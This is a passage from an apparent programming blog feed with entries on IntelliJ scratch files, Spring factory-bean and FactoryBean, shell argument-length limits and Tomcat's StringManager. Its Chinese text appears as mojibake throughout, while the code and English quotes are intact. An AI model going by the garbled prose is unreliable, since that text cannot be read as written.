      <content type="html"><![CDATA[<h2 id="ç¼˜èµ·"><a href="#ç¼˜èµ·" class="headerlink" title="ç¼˜èµ·"></a>ç¼˜èµ·</h2><p>Intellijä¸­é»˜è®¤æ–°å»ºæ–‡ä»¶å¿…é¡»æŒ‡å®šå­˜å‚¨çš„ä½ç½®ï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™æˆ‘ä»¬å¯èƒ½åªæ˜¯æƒ³åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„æ–‡ä»¶é¡ºæ‰‹è®°å½•ä¸€äº›ä¸œè¥¿ã€‚è¿™ä¸ªåŠŸèƒ½ç±»ä¼¼<code>NotePad++</code>æˆ–è€…<code>sublime text</code>ä¸­çš„æ–°å»ºtabï¼Œè¿™ä¸ªtabé»˜è®¤æ˜¯ä¸è½åœ°åˆ°æ–‡ä»¶çš„ï¼Œä½†æ˜¯å…¶ä¸­çš„å†…å®¹ä¼šä»¥ä¸´æ—¶æ–‡ä»¶å­˜å‚¨èµ·æ¥ã€‚</p>
<p>åœ¨Googleä¸Šæœç´¢äº†å¤§åŠå¤©ï¼Œä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„åŠŸèƒ½ï¼ˆä¸»è¦æ˜¯å…³é”®è¯æç‚¼çš„ä¸è¡Œï¼‰ã€‚åæ¥é˜´å·®é˜³é”™åœ°æœåˆ°äº†scratches file, ç¿»è¯‘äº†ä¸€ä¸‹ï¼Œæ­£æ˜¯æˆ‘è¦æ‰¾çš„åŠŸèƒ½ï¼ (è‹±è¯­å·®çœŸæ˜¯å®³æ­»äººå•Šï¼)</p>
<blockquote>
<p>scratch file è¿‡æœŸæ–‡ä»¶ï¼›ä¸´æ—¶æ–‡ä»¶</p>
</blockquote>
<h3 id="scratchesä¼˜åŠ¿"><a href="#scratchesä¼˜åŠ¿" class="headerlink" title="scratchesä¼˜åŠ¿"></a>scratchesä¼˜åŠ¿</h3><blockquote>
<ol>
<li>The scratch code in scripting languages is <em>executable</em>.</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li>you can run and <em>debug</em> it.</li>
</ol>
</blockquote>
<blockquote>
<ol start="3">
<li><em>Local history</em> for scratches is supported.</li>
</ol>
</blockquote>
<blockquote>
<ol start="4">
<li>It is possible to perform <em>clipboard operations</em> with scratches.</li>
</ol>
</blockquote>
<blockquote>
<ol start="5">
<li>The scratches are <em>stored</em>, depending on your operating system,<br>Under IntelliJ IDEA home, in the directory config/scratches (on Windows/*NIX)<br>~ Library-&gt;Preferences-&gt;<intellij idea>XX-&gt;scratches(on OS X)<br>You can undo or redo changes in scratches.</intellij></li>
</ol>
</blockquote>
<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>ä»¥ä¸‹åŠŸèƒ½åŸºäºIntellij Idea 2016.3.4</p>
<p><code>Ctrl + Shift + A</code>åœ¨æœç´¢æ¡†ä¸­è¾“å…¥ <code>scratch</code>ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„ä¸¤ä¸ªåŠŸèƒ½ï¼š</p>
<img src="/2017/02/15/idea-scratches/search.jpg">
<p>è¿™é‡Œä¼šå‡ºç°ä¸¤ä¸ªscratch ç›¸å…³çš„é€‰é¡¹ï¼Œ ä¸€ä¸ªæ˜¯scratch bufferï¼Œ ä¸€ä¸ªæ˜¯scratch fileã€‚<br>scratch bufferä¸ç”¨é€‰æ‹©è¯­æ³•ï¼Œscratch fileåˆ™ä¼šè®©ä½ é€‰æ‹©å¯¹åº”çš„è¯­æ³•</p>
<img src="/2017/02/15/idea-scratches/new.jpg">
<p>åˆ›å»ºä¹‹åï¼Œå¯ä»¥åœ¨ä¸‹é¢çš„ä½ç½®æŸ¥çœ‹:</p>
<img src="/2017/02/15/idea-scratches/menu.jpg">
<img src="/2017/02/15/idea-scratches/scratches.jpg">
<h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>å¿«æ·é”®éœ€è¦æŒ‰çš„é”®æ¯”è¾ƒå¤šï¼Œå¯ä»¥è‡ªå·±å®šåˆ¶ä¸‹ï¼Œæ¯”å¦‚ä½¿ç”¨å…ˆåæŒ‰é”®çš„é‚£ç§ã€‚</p>
<img src="/2017/02/15/idea-scratches/keymap.jpg">
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://www.jetbrains.com/help/idea/2016.3/scratches.html" rel="external nofollow noopener noreferrer" target="_blank">IntelliJ IDEA 2016.3 Help :: Scratches</a></p>
</li>
<li><p><a href="http://docs.notepad-plus-plus.org/index.php/Sessions_And_Projects" rel="external nofollow noopener noreferrer" target="_blank">Sessions And Projects - Notepad++ Wiki</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> idea </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Springä¸­çš„factory-beanå’ŒFactoryBean]]></title>
      <url>http://qsli.github.io/2017/02/14/factorybean/</url>
      <content type="html"><![CDATA[<h3 id="factory-bean"><a href="#factory-bean" class="headerlink" title="factory-bean"></a>factory-bean</h3><p>springçš„beanæ ‡ç­¾çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨æ¥æŒ‡å®šåˆ›å»ºå®ä¾‹çš„æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ClientService clientService = <span class="keyword">new</span> ClientService();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ClientService</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ClientService <span class="title">createInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> clientService;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultServiceLocator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ClientService clientService = <span class="keyword">new</span> ClientServiceImpl();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AccountService accountService = <span class="keyword">new</span> AccountServiceImpl();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">DefaultServiceLocator</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ClientService <span class="title">createClientServiceInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> clientService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AccountService <span class="title">createAccountServiceInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ç¬¬ä¸€ç§å†™æ³•"><a href="#ç¬¬ä¸€ç§å†™æ³•" class="headerlink" title="ç¬¬ä¸€ç§å†™æ³•"></a>ç¬¬ä¸€ç§å†™æ³•</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clientService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">class</span>=<span class="string">"examples.ClientService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-method</span>=<span class="string">"createInstance"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ç§å†™æ³•è¦æ±‚<code>factory-method</code>å¿…é¡»æ˜¯<code>static</code>çš„</p>
<h4 id="ç¬¬äºŒç§å†™æ³•"><a href="#ç¬¬äºŒç§å†™æ³•" class="headerlink" title="ç¬¬äºŒç§å†™æ³•"></a>ç¬¬äºŒç§å†™æ³•</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"serviceLocator"</span> <span class="attr">class</span>=<span class="string">"examples.DefaultServiceLocator"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- inject any dependencies required by this locator bean --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clientService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-bean</span>=<span class="string">"serviceLocator"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-method</span>=<span class="string">"createClientServiceInstance"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-bean</span>=<span class="string">"serviceLocator"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-method</span>=<span class="string">"createAccountServiceInstance"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ç§å†™æ³•å¤šäº†ä¸€ä¸ª<code>factory-bean</code>ï¼ŒæŒ‡å®šäº†ä½¿ç”¨å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•å»åˆ›å»ºï¼Œä¸è¦æ±‚è¿™ä¸ªæ–¹æ³•æ˜¯<code>static</code>ï¼Œä½†æ˜¯<code>factory-bean</code>å¯¹åº”çš„ç±»å¿…é¡»äº¤ç”±springç®¡ç†ã€‚</p>
<p>ä¸€ä¸ªç±»ä¸­å¯ä»¥åŒ…å«å¤šä¸ªåˆ›å»ºçš„æ–¹æ³•ã€‚</p>
<h3 id="FactoryBean"><a href="#FactoryBean" class="headerlink" title="FactoryBean"></a>FactoryBean</h3><p>æ˜¯Springæä¾›çš„ä¸€ä¸ªæ¥å£ï¼Œç”¨æ¥å®šåˆ¶Beançš„åˆå§‹åŒ–é€»è¾‘ã€‚</p>
<blockquote>
<p>If you have complex initialization code that is better expressed in Java as opposed to a (potentially) verbose amount of XML, you can create your own FactoryBean</p>
</blockquote>
<blockquote>
<p>  Interface to be implemented by objects used within a {@link BeanFactory} which<br>    are themselves factories for individual objects. If a bean implements this<br>    interface, it is used as a factory for an object to expose, not directly as a<br>    bean instance that will be exposed itself.</p>
</blockquote>
<p>è¿™ä¸ªæ¥å£æœ‰ä¸‰ä¸ªæ–¹æ³•ï¼š</p>
<ul>
<li>Object getObject()</li>
</ul>
<p>è·å–åˆ›å»ºçš„å¯¹è±¡</p>
<ul>
<li>boolean isSingleton()</li>
</ul>
<p>è¿”å›çš„å¯¹è±¡æ˜¯å¦æ˜¯å•ä¾‹çš„</p>
<ul>
<li>Class getObjectType()</li>
</ul>
<p>è·å–è¿”å›çš„å¯¹è±¡çš„ç±»å‹</p>
<p><code>GsonFactoryBean</code>å°±å®ç°äº†<code>FactoryBean</code>æ¥å£ï¼Œæ˜¯ä¸€ä¸ªä¸é”™çš„ä¾‹å­ï¼Œå¤§æ¦‚ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GsonFactoryBean</span> <span class="keyword">implements</span> <span class="title">FactoryBean</span>&lt;<span class="title">Gson</span>&gt;, <span class="title">InitializingBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> base64EncodeByteArrays = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> serializeNulls = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> prettyPrinting = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> disableHtmlEscaping = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String dateFormatPattern;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Gson gson;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBase64EncodeByteArrays</span><span class="params">(<span class="keyword">boolean</span> base64EncodeByteArrays)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.base64EncodeByteArrays = base64EncodeByteArrays;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSerializeNulls</span><span class="params">(<span class="keyword">boolean</span> serializeNulls)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.serializeNulls = serializeNulls;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrettyPrinting</span><span class="params">(<span class="keyword">boolean</span> prettyPrinting)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.prettyPrinting = prettyPrinting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDisableHtmlEscaping</span><span class="params">(<span class="keyword">boolean</span> disableHtmlEscaping)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.disableHtmlEscaping = disableHtmlEscaping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDateFormatPattern</span><span class="params">(String dateFormatPattern)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dateFormatPattern = dateFormatPattern;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        GsonBuilder builder = (<span class="keyword">this</span>.base64EncodeByteArrays ?</span><br><span class="line">                GsonBuilderUtils.gsonBuilderWithBase64EncodedByteArrays() : <span class="keyword">new</span> GsonBuilder());</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.serializeNulls) &#123;</span><br><span class="line">            builder.serializeNulls();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.prettyPrinting) &#123;</span><br><span class="line">            builder.setPrettyPrinting();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.disableHtmlEscaping) &#123;</span><br><span class="line">            builder.disableHtmlEscaping();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.dateFormatPattern != <span class="keyword">null</span>) &#123;</span><br><span class="line">            builder.setDateFormat(<span class="keyword">this</span>.dateFormatPattern);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.gson = builder.create();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Gson <span class="title">getObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.gson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        <span class="keyword">return</span> Gson<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>GsonFactoryBean</code>é™¤äº†å®ç°äº†<code>FactoryBean</code>æ¥å£ï¼Œè¿˜å®ç°äº†<code>InitializingBean</code>æ¥å£ï¼Œè¿™ä¸ªæ¥å£åªæœ‰ä¸€ä¸ªæ–¹æ³•</p>
<p><code>afterPropertiesSet</code>ã€‚è¿™ä¸ªæ–¹æ³•ä¼šåœ¨beançš„æ‰€æœ‰æä¾›çš„å±æ€§è¢«è®¾ç½®ä¹‹åï¼Œè¢«BeanFactoryè°ƒç”¨ï¼Œæ˜¯springä¿ç•™çš„ä¸€ä¸ªæ‰©å±•ç‚¹ã€‚</p>
<p><code>GsonFactoryBean</code>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å°†æ”¶é›†åˆ°çš„é…ç½®ä¿¡æ¯ä¼ ç»™builderï¼Œæ„å»ºå‡ºä¸€ä¸ª<code>Gson</code>å¯¹è±¡ï¼ˆè¿™ç§ä¸€èˆ¬æ˜¯å¤§å¯¹è±¡ï¼Œä¸€ä¸ªå®¹å™¨ä¸­æœ‰ä¸€ä¸ªå°±å¤Ÿäº†ï¼‰ã€‚</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"gsonFactoryBean"</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.GsonFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dateFormatPattern"</span> <span class="attr">value</span>=<span class="string">"yyyy-MM-dd"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"disableHtmlEscaping"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prettyPrinting"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ol>
<li><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/html/beans.html" rel="external nofollow noopener noreferrer" target="_blank">7. The IoC container</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> beanfactory </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[shellå‘½ä»¤é•¿åº¦é™åˆ¶]]></title>
      <url>http://qsli.github.io/2017/02/06/shell-input-limit/</url>
      <content type="html"><![CDATA[<h2 id="ä¸¤ä¸ªå‘½ä»¤"><a href="#ä¸¤ä¸ªå‘½ä»¤" class="headerlink" title="ä¸¤ä¸ªå‘½ä»¤"></a>ä¸¤ä¸ªå‘½ä»¤</h2><h3 id="ARG-MAX"><a href="#ARG-MAX" class="headerlink" title="ARG_MAX"></a>ARG_MAX</h3><blockquote>
<p>The limit for the length of a command line is not imposed by the shell, but by the operating system. This limit is usually in the range of hundred kilobytes. POSIX denotes this limit ARG_MAX and on POSIX conformant systems you can query it with</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getconf ARG_MAX    <span class="comment"># Get argument limit in bytes</span></span><br></pre></td></tr></table></figure>
<p>åœ¨æˆ‘çš„cygwinä¸Šçš„ç»“æœ:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  getconf ARG_MAX</span><br><span class="line">32000</span><br></pre></td></tr></table></figure>
<h3 id="xargs-â€“show-limits"><a href="#xargs-â€“show-limits" class="headerlink" title="xargs â€“show-limits"></a>xargs â€“show-limits</h3><p>æˆ‘çš„Cygwinä¸Šçš„ç»“æœ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">âœ   xargs --show-limits</span><br><span class="line">æ‚¨çš„ç¯å¢ƒå˜é‡å æœ‰ 7787 ä¸ªå­—èŠ‚</span><br><span class="line">æ­¤ç³»ç»Ÿçš„å‚æ•°é•¿åº¦ POSIX ä¸Šé™: 22165</span><br><span class="line">æ‰€æœ‰ç³»ç»Ÿä¸­æ‰€å…è®¸çš„æœ€å°å‚æ•°é•¿åº¦ POSIX ä¸Šé™: 4096</span><br><span class="line">æˆ‘ä»¬å®é™…èƒ½ç”¨çš„æœ€å¤§å‘½ä»¤é•¿åº¦: 14378</span><br><span class="line">æˆ‘ä»¬å®é™…èƒ½ç”¨çš„å‘½ä»¤ç¼“å†²åŒºçš„å¤§å°: 22165</span><br><span class="line">Maximum parallelism (--max-procs must be no greater): 2147483647</span><br><span class="line"></span><br><span class="line">xargs ä¸­çš„å‘½ä»¤ç°åœ¨å°†ç»§ç»­æ‰§è¡Œï¼Œå¹¶ä¸”å®ƒä¼šå°è¯•è¯»å–è¾“å…¥å¹¶è¿è¡Œå‘½ä»¤ï¼›å¦‚æœæ‚¨ä¸æƒ³å®ƒå‘ç”Ÿï¼Œè¯·æŒ‰ä¸‹â€œæ–‡ä»¶ç»“æŸâ€æŒ‰é”®(ctrl-D)ã€‚</span><br><span class="line">è­¦å‘Š: echo å°†è‡³å°‘è¿è¡Œä¸€æ¬¡ã€‚å¦‚æœæ‚¨ä¸æƒ³å®ƒå‘ç”Ÿï¼Œè¯·æŒ‰ä¸‹ä¸­æ–­æŒ‰é”®ã€‚(ctrl-C)</span><br></pre></td></tr></table></figure>
<h2 id="ç»•è¿‡é™åˆ¶"><a href="#ç»•è¿‡é™åˆ¶" class="headerlink" title="ç»•è¿‡é™åˆ¶"></a>ç»•è¿‡é™åˆ¶</h2><p>ä½¿ç”¨è„šæœ¬ç¼–å†™ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://stackoverflow.com/questions/19354870/bash-command-line-and-input-limit" rel="external nofollow noopener noreferrer" target="_blank">shell - Bash command line and input limit - Stack Overflow</a></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/6846263/maximum-length-of-command-line-argument-that-can-be-passed-to-sqlplus-from-lin" rel="external nofollow noopener noreferrer" target="_blank">Maximum length of command line argument that can be passed to SQL*Plus (from Linux C Shell)? - Stack Overflow</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
        <tags>
            
            <tag> limit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcatä¸­çš„StringManager]]></title>
      <url>http://qsli.github.io/2017/02/06/tomcat-stringmanager/</url>
      <content type="html"><![CDATA[<p>tomcatä¸­ä½¿ç”¨StringManageræ¥ç®¡ç†é”™è¯¯æç¤ºä¿¡æ¯ï¼Œé”™è¯¯ä¿¡æ¯å­˜å‚¨åœ¨<code>LocalStrings.properties</code>æ–‡ä»¶ä¸­ï¼Œæ”¯æŒåŒ…çº§åˆ«çš„æ–‡ä»¶é…ç½®ã€‚</p>
<h2 id="StringManager"><a href="#StringManager" class="headerlink" title="StringManager"></a>StringManager</h2><p>æ„é€ å‡½æ•°ç§æœ‰ï¼Œé€šè¿‡é™æ€æ–¹æ³•<code>getManager</code>è·å–å¯¹åº”packageçš„å®ä¾‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Hashtable&lt;String, StringManager&gt; managers =</span><br><span class="line">        <span class="keyword">new</span> Hashtable&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the StringManager for a particular package. If a manager for</span></span><br><span class="line"><span class="comment"> * a package already exists, it will be reused, else a new</span></span><br><span class="line"><span class="comment"> * StringManager will be created and returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> packageName The package name</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">synchronized</span> StringManager <span class="title">getManager</span><span class="params">(String packageName)</span> </span>&#123;</span><br><span class="line">    StringManager mgr = managers.get(packageName);</span><br><span class="line">    <span class="keyword">if</span> (mgr == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mgr = <span class="keyword">new</span> StringManager(packageName);</span><br><span class="line">        managers.put(packageName, mgr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mgr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="LocalStrings"><a href="#LocalStrings" class="headerlink" title="LocalStrings"></a>LocalStrings</h2><p>æœ¬èº«æ”¯æŒå›½é™…åŒ–(i18n), LocalStrings.propertiesï¼ˆè‹±æ–‡ï¼‰ã€LocalStrings_es.propertiesï¼ˆè¥¿ç­ç‰™è¯­ï¼‰ã€LocalStrings_ja.propertiesï¼ˆæ—¥è¯­ï¼‰</p>
<p>æ–‡ä»¶ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contextBindings.unknownContext=Unknown context name : &#123;0&#125;</span><br><span class="line">contextBindings.noContextBoundToThread=No naming context bound to this thread</span><br><span class="line">contextBindings.noContextBoundToCL=No naming context bound to this class loader</span><br><span class="line">selectorContext.noJavaUrl=This context must be accessed through a java: URL</span><br><span class="line">selectorContext.methodUsingName=Call to method &apos;&apos;&#123;0&#125;&apos;&apos; with a Name of &apos;&apos;&#123;1&#125;&apos;&apos;</span><br></pre></td></tr></table></figure>
